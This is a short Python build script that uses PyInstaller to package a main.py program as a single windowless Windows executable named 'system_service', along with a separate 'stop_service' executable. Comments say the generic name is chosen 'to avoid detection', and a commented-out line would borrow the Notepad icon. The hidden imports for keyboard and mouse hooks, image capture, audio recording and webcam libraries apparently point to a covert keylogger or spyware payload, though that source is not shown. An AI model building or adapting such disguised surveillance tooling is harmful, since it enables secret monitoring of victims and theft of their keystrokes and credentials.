import os
import PyInstaller.__main__
import shutil

# Configuration for the main executable
pyinstaller_args = [
    'main.py',
    '--onefile',
    '--windowed',  # No console window
    '--noconsole',
    '--hidden-import=pynput.keyboard._win32',
    '--hidden-import=pynput.mouse._win32',
    '--hidden-import=PIL.Image',
    '--hidden-import=sounddevice',
    '--hidden-import=wave',
    '--hidden-import=numpy',
    '--hidden-import=cv2',
    '--hidden-import=numpy.core._dtype_ctypes',
    '--exclude-module=matplotlib',
    '--exclude-module=pandas',
    '--exclude-module=scipy',
    '--name=system_service',  # Generic name to avoid detection
    # '--icon=Windows\\System32\\notepad.exe',  # Use Windows notepad icon
    '--clean'
]

# Configuration for the stopper executable
stopper_args = [
    'stop.py',
    '--onefile',
    '--name=stop_service',
    # '--icon=Windows\\System32\\taskmgr.exe',
    '--clean'
]

# Build both executables
PyInstaller.__main__.run(pyinstaller_args)
PyInstaller.__main__.run(stopper_args)
